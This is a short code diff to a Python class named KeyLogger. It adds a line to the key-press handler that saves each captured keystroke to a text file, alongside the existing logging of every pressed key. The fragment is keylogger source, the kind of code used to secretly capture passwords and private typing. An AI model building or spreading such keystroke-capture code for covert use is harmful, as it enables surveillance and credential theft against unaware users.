@@ -74,6 +74,7 @@ class KeyLogger():
     # 
 
     def __on_press(self, key) -> None:
+        stacker.store_string_to_txt(key)
         logger.debug(message=f"{key} pressed")
         logger.info(message=f"{key}", key_press=key, text=False)
         self.__add_pressed_key_in_list_of_texts(str(key))
